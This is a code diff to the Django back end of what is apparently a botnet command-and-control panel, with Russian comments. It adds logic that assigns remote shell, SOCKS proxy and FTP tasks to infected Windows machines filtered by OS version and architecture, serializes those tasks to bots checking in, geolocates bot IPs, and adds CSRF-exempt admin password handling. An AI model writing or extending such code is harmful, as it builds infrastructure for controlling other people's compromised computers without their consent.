@@ -9,6 +9,7 @@ from .models import Bot, Session, Task
 import datetime
 import struct
 import requests
+from django.db import models
 
 
 # from django.core.paginator import Paginator
@@ -20,6 +21,8 @@ class Subsidiary:
 
     @staticmethod
     def get_country(ip: str):
+        if ip == '127.0.0.1':
+            return ''
         country = requests.get(f'http://api.sypexgeo.net/json/{ip}').json()['country']['iso'].lower()
         return country
 
@@ -149,6 +152,14 @@ class AdminPanel:
             return HttpResponse('недостачно прав для просмотра')
         return render(request, 'main/admin_table.html', {'tasks': Task.objects.all()})
 
+    @staticmethod
+    def change_password(request):
+        return render(request, 'main/change_password.html')
+
+    @staticmethod
+    def get_settings_page(request):
+        return render(request, 'main/settings.html')
+
 
 # ГЛАВНЫЙ КЛАСС АДМИНКИ --------------------------- /\
 
@@ -163,6 +174,22 @@ class Handlers:
 
     def test(self):
         return JsonResponse(self.s)
+
+    @csrf_exempt
+    def change_password(self, request):
+        old = request.POST['old']
+        new = request.POST['new']
+
+        if not request.user.check_password(old):
+            print('ok')
+            return HttpResponse('')
+
+        request.user.set_password(new)
+        request.user.save()
+
+        login(request, request.user)
+
+        return HttpResponse('200')
 
     @csrf_exempt
     def add_comment(self, request):
@@ -186,13 +213,18 @@ class Handlers:
     @staticmethod
     def login_handler(request) -> HttpResponse or JsonResponse:
         username = request.POST['login']
-        usr = User.objects.get(username=username)
 
-        if usr.check_password(request.POST['password']):
+        try:
+            usr = User.objects.get(username=username)
+            res = usr.check_password(request.POST['password'])
+            if not res:
+                return JsonResponse({'v': '400'})
+
             login(request, usr)
-            print('login')
             return JsonResponse({'v': '200'})
-        return HttpResponse('')
+        except Exception as e:
+            print(e)
+            return JsonResponse({'v': '400'})
 
     @csrf_exempt
     def backconnect(self, request):
@@ -304,9 +336,26 @@ class Handlers:
             bot.is_online = True
             bot.save()
 
+            print(bot.tasks.all())
+            print(bot.tasks.all()[0].type1)
+
+            s = {
+                'ftp': 2,
+                'sock': 3,
+                'shell': 1
+            }
+
+            task = bot.tasks.all()[0]
+
+            giveaway = PanelMsg.TaskGiveaway()
+            giveaway.type = s[task.type1]
+            giveaway.task_id = str(task.id).encode('utf-16-le')
+            giveaway.server = '127.0.0.1'.encode('utf-16-le')
+            giveaway.port = 8000
+            giveaway.SerializeToString()
             print(bot.date_ch)
 
-            return HttpResponse('200')
+            return HttpResponse(giveaway)
 
         elif msg_type == 3:
             print(3)
@@ -340,10 +389,25 @@ class Handlers:
         x_oc = [i for i in _true if 'x' in i]
         print(wins, x_oc)
 
-        task = Task(name=name, country=country, type1=_type, win_os=':'.join(wins), x_oc=':'.join(x_oc), repetitions=data['reps'],
+        s = {
+            'win7': Bot.objects.filter(is_win7=True),
+            'win8': Bot.objects.filter(is_win8=True),
+            'win10': Bot.objects.filter(is_win10=True),
+            'win11': Bot.objects.filter(is_win11=True),
+            'all_win': Bot.objects.all()
+        }
+
+        bots = [s[win] for win in wins if len(s[win]) != 0]
+        _bots = [bot for bot in bots[0] if ('x32' if bot.is_x64 is False else 'x64') in x_oc]
+
+        task = Task(name=name, country=country, type1=_type, winos=':'.join(wins), xoc=':'.join(x_oc),
+                    repetitions=data['reps'],
                     done=0)
         task.save()
 
+        for bot in _bots:
+            bot.tasks.add(task)
+
         return HttpResponse('200')
 
-# ОБРАБОТЧИКИ -------------------------------------------- /
+# ОБРАБОТЧИКИ -------------------------------------------- /\
